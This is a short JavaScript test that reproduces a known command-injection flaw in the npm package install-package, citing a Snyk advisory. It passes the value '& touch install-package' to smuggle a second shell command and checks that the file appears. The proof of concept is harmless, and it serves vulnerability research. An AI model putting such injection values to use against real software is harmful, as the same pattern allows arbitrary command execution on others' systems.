//https://snyk.io/vuln/SNYK-JS-INSTALLPACKAGE-564267
test("Command Injection in install-package", () => {
  const root = require("install-package");
  const fs = require("fs");
  const path = "./install-package";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  root("", "& touch install-package");
  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
